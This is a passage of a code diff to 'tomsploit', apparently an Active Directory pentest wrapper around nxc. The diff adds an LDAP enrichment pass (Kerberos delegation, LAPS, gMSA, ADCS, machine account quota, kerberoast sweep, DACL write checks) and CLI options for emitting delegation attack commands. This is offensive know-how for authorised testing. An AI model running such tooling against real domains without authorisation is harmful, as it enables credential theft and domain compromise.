+                self._enrich_roastability(target, cred, result.deleg_rows)
+            except Exception:
+                pass          # leaves roast_checked False -> emitters fall back
+        # 'Getting GMSA Passwords' is nxc's own display() banner, not a finding.
+        result.laps_hits = self._enrich_highlights(outs.get("laps", ""))
+        result.gmsa_hits = self._enrich_highlights(
+            outs.get("gmsa", ""), drop_prefixes=("Getting GMSA",))
+        result.adcs_hits = self._enrich_highlights(outs.get("adcs", ""))
+        result.maq = _parse_maq(outs.get("maq", ""))
+        result.roastable_sweep = _parse_roast_sweep(outs.get("roast", ""))
+        # Per-account DIRECT-ACE write check (daclread). Only for accounts that
+        # a write would actually help: user delegating accounts (plant an SPN)
+        # and RBCD victims. Group-inherited rights are invisible to daclread —
+        # BloodHound (already suggested) covers those.
+        if result.deleg_rows:
+            try:
+                self._enrich_dacls(target, cred, result.deleg_rows)
+            except Exception:
+                pass
+        result.enriched = True
+
+        bits = []
+        if result.deleg_rows:
+            kinds: dict[str, int] = {}
+            for r in result.deleg_rows:
+                kinds[r.kind.value] = kinds.get(r.kind.value, 0) + 1
+            bits.append("delegation: " + ", ".join(f"{v}x {k}"
+                                                   for k, v in sorted(kinds.items())))
+        if result.laps_hits:
+            bits.append(f"LAPS: {len(result.laps_hits)} readable")
+        if result.gmsa_hits:
+            bits.append(f"gMSA: {len(result.gmsa_hits)}")
+        if result.adcs_hits:
+            bits.append(f"ADCS: {len(result.adcs_hits)} object(s)")
+        if result.maq is not None:
+            bits.append(f"MAQ: {result.maq}")
+        if result.roastable_sweep:
+            bits.append(f"roastable: {len(result.roastable_sweep)} SPN account(s)")
+        result.enrich_notes = bits
+        if bits:
+            self._say(f"  {CYAN}{BOLD}⊕ enrich{RESET} {CYAN}"
+                      f"{'; '.join(bits)}{RESET}")
+
+    def _enrich_roastability(self, target: str, cred: "Success",
+                             rows: list) -> None:
+        """One LDAP query over exactly the delegation accounts, pulling
+        servicePrincipalName + userAccountControl, to decide how to get INTO
+        each. Anchoring on these accounts (not a domain-wide roast) keeps it a
+        single cheap query and avoids dumping every SPN in the domain."""
+        names = [r.account for r in rows if r.account and "<" not in r.account]
+        if not names:
+            return
+        # Build an OR filter over the sAMAccountNames. Escape per RFC 4515.
+        def esc(v: str) -> str:
+            return (v.replace("\\", "\\5c").replace("(", "\\28")
+                     .replace(")", "\\29").replace("*", "\\2a")
+                     .replace("\x00", "\\00"))
+        ors = "".join(f"(sAMAccountName={esc(n)})" for n in names)
+        filt = f"(|{ors})" if len(names) > 1 else ors
+        out = self._enrich_nxc(target, cred,
+                               ["--query", filt,
+                                "sAMAccountName servicePrincipalName "
+                                "userAccountControl msDS-AllowedToDelegateTo"])
+        if not out:
+            return
+        info = _parse_roast_query(out)
+        for r in rows:
+            rec = info.get(r.account.lower())
+            r.roast_checked = True
+            if rec:
+                r.own_spn = rec.get("spn", "")
+                r.uac = rec.get("uac", 0)
+                r.allowed_to = rec.get("allowed_to", [])
+
+    def _enrich_dacls(self, target: str, cred: "Success", rows: list) -> None:
+        """Per-account DIRECT-ACE write check. Runs nxc daclread against each
+        account a write would help — a USER delegating account (plant an SPN)
+        or an RBCD victim — and records the trustees holding a direct write.
+
+        Deliberately targeted, not a sweep: daclread reads ONE object per call
+        and cannot see group-inherited rights, so a domain-wide run would be
+        both slow and misleading. One call per relevant account, and the output
+        is always framed as 'direct ACEs only — BloodHound for group rights'."""
+        # Which accounts is a write actually useful against?
+        def wants_write(r) -> bool:
+            if "<" in r.account:
+                return False
+            if r.kind == DelegKind.RBCD:
+                return True                    # victim: write = set up the edge
+            if r.kind == DelegKind.UNCONSTRAINED and not r.is_computer:
+                return True                    # user: write = plant an SPN
+            return False
+
+        for r in rows:
+            if not wants_write(r) or self._stop.is_set():
+                continue
+            targets = r.rights_to if r.kind == DelegKind.RBCD else [r.account]
+            found: list[str] = []
+            for tgt in targets:
+                sam = tgt.strip()
+                if not sam or "<" in sam:
+                    continue
+                out = self._enrich_nxc(target, cred,
+                                       ["-M", "daclread",
+                                        "-o", f"TARGET={sam}", "ACTION=read"])
+                if out:
+                    found.extend(_parse_dacl_writers(out))
+            # dedupe, drop the account itself (self-ACE is not useful)
+            seen = set()
+            r.direct_writers = [w for w in found
+                                if not (w.lower() in seen or seen.add(w.lower()))]
 
     # ── full scan ─
     def run(self) -> int:
@@ -3597,10 +5543,20 @@ examples:
   tomsploit -t 192.168.1.10 -u admin -p pw --protocols smb,winrm,rdp
   tomsploit -t targets.txt -u u.txt -p p.txt --creds-file creds.tsv
   tomsploit -t 192.168.1.10 -u admin -p pw --sh > next.sh   # paste-ready commands
+
+  # Kerberos delegation is automatic: a valid DC login triggers the enrichment
+  # pass, which writes tomsploit-delegation-<ip>-<user>.txt with the routes.
+  tomsploit -t 10.10.10.5 -u carole -p pw              # deleg file written if found
+  tomsploit -t 10.10.10.5 -u carole -p pw --no-enrich  # skip the extra queries
+
+  # Or run the delegation engine offline on findDelegation output you have:
+  nxc ldap 10.10.10.5 -u u -p p --find-delegation | tomsploit --deleg-in - -t 10.10.10.5 -d corp1.com --dc-name DC01 -u u -p p
 """,
     )
-    p.add_argument("-t", "--target", required=True,
-                   help="IP, hostname, CIDR, or file containing any of these.")
+    p.add_argument("-t", "--target",
+                   help="IP, hostname, CIDR, or file containing any of these. "
+                        "Required except with --deleg-in, where it is optional "
+                        "and supplies the DC IP for the emitted commands.")
     p.add_argument("-u", "--user",
                    help="Username or path to users file. "
                         "(Optional when --combo is used.)")
@@ -3637,6 +5593,22 @@ examples:
                         "tried as Pass-the-Hash, anything else as a password. "
                         "Replaces -u/-p/-H; split on the first ':' so "
                         "passwords may contain colons.")
+    p.add_argument("--deleg-in", metavar="FILE", dest="deleg_in",
+                   help="Offline mode: read findDelegation / "
+                        "'nxc --find-delegation' table output and emit the "
+                        "delegation routes for whatever it contains (same "
+                        "GET/REQUIRED/MISSING/WHY format as a live scan), with "
+                        "account and target names filled in. Use '-' for "
+                        "stdin. Scans and spawns nothing, so the roastability/ "
+                        "MAQ/DACL enrichment does NOT run here — pass --dc-name "
+                        "for the on-DC delegation check, and -d/-u/-p/-H to "
+                        "fill your own credential into the commands.")
+    p.add_argument("--dc-name", metavar="NAME", dest="dc_name",
+                   help="DC short hostname (e.g. DC01), used with --deleg-in "
+                        "so tomsploit can spot a delegation SPN pointing at "
+                        "the DC itself — which is domain compromise via an "
+                        "ldap/ sname swap, not a lateral move. A live scan "
+                        "learns this by itself.")
     p.add_argument("-o", "--output",
                    help="Write a consolidated scan log here (raw command output + a per-target summary). No default: omit -o and no log is written.")
     p.add_argument("--creds-file", metavar="FILE",
@@ -3654,6 +5626,40 @@ examples:
                    help="Run even if the attempt count exceeds --max-attempts.")
     p.add_argument("--no-port-probe", action="store_true",
                    help="Skip pre-flight TCP port probe.")
+    p.add_argument("--no-enrich", action="store_true",
+                   help="Skip the post-scan LDAP enrichment pass. By default, "
+                        "when an LDAP credential works on a DC, tomsploit runs "
+                        "a batch of read-only queries and feeds the results "
+                        "into the delegation routes: --find-delegation, plus "
+                        "-M laps / --gmsa / -M adcs / -M maq and a kerberoast "
+                        "sweep (six in parallel), then a targeted "
+                        "servicePrincipalName/userAccountControl query and a "
+                        "per-account daclread over the delegation accounts. "
+                        "The results resolve each route (roastable now? "
+                        "disabled? MAQ 0? who can write it?) and drop "
+                        "LAPS/gMSA/ADCS blocks the domain has nothing for. All "
+                        "read-only; costs roughly a dozen nxc spawns per DC.")
+    p.add_argument("--bare", action="store_true",
+                   help="Commands only — no outcome hints, no labels, no "
+                        "prose. The most compact output there is.")
+    p.add_argument("--notes", action="store_true",
+                   help="Keep the explanatory comments in the suggested "
+                        "commands. Off by default: the output is the next "
+                        "command, not a walkthrough. --notes restores the "
+                        "reasoning, the caveats and the commented-out "
+                        "alternatives.")
+    p.add_argument("--deleg-inline", action="store_true", dest="deleg_inline",
+                   help="Print the full delegation command blocks in the "
+                        "terminal instead of summarising them and writing "
+                        "them to a file. (--sh always inlines them, since "
+                        "that output is already going to a file.)")
+    p.add_argument("--deleg-out", metavar="FILE", dest="deleg_out",
+                   help="Where to write the delegation command set. Default is "
+                        "./tomsploit-delegation-<ip>-<user>.txt — keyed on the "
+                        "account too, because the commands are written for "
+                        "whoever ran the scan, so a second account against the "
+                        "same DC does NOT overwrite the first. An explicit path "
+                        "here is used verbatim (you manage collisions).")
     p.add_argument("--max-cidr-hosts", type=int, default=DEFAULT_MAX_CIDR_HOSTS,
                    help=f"Max hosts in any one CIDR (default: {DEFAULT_MAX_CIDR_HOSTS}).")
     verbosity = p.add_mutually_exclusive_group()
@@ -3858,7 +5864,9 @@ def build_config(args: argparse.Namespace) -> Config:
         debug=args.debug, no_port_probe=args.no_port_probe,
         paired=paired, domain=(args.domain or "").strip(),
         force=args.force, max_attempts=args.max_attempts,
-        sh_only=args.sh,
+        sh_only=args.sh, no_enrich=args.no_enrich,
+        deleg_inline=args.deleg_inline, deleg_out=(args.deleg_out or ""),
+        notes=args.notes, bare=args.bare,
     )
 
 
@@ -3866,6 +5874,17 @@ def main() -> int:
     args = parse_args()
     # --sh must emit a clean script: no ANSI, ever.
     configure_colors(args.no_color or args.sh)
+
+    # --deleg-in is an offline transform: it spawns nothing, needs no
+    # credential set and no target list, so it short-circuits ahead of
+    # build_config (which would otherwise demand both).
+    if args.deleg_in:
+        return run_deleg_mode(args)
+
+    if not args.target:
+        print(f"{RED}{BOLD}Error:{RESET} -t/--target is required "
+              f"(only --deleg-in may omit it).", file=sys.stderr)
+        return 1
 
     try:
         cfg = build_config(args)
